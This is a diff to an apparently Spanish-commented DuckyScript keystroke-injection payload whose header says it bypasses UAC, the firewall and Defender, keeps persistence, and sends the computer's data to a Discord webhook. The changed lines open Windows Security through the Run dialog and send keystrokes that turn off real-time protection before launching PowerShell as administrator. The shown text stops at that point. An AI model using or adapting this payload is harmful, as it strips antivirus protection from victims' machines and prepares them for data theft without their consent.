@@ -4,43 +4,19 @@ REM Bypasses UAC, Firewall, y Defender con persistencia
 REM Exfiltración de datos del equipo a un servidor de discord mediante webhook
 
 
-GUI m
+GUI r
 DELAY 2000
 REM Abrir seguridad de Windows
-CTRL ESC
+STRING windowsdefender://ThreatSettings
+DELAY 500
+ENTER
 DELAY 750
-STRING Seguridad de Windows
-ENTER
-DELAY 1500
-REM ENTER
-REM Navegar a protección antivirus
-DELAY 500
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-ENTER
-DELAY 500
-REM Administrar configuración
-DELAY 500
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-TAB
-DELAY 100
-ENTER
-DELAY 500
-REM Desactivar protección en tiempo real
 SPACE
-DELAY 1000
-REM Salir de Seguridad de Windows
+DELAY 100
+LEFT
+DELAY 100
+ENTER
+DELAY 100
 ALT F4
 DELAY 3000
 REM Vamos a por PowerShell como administrador
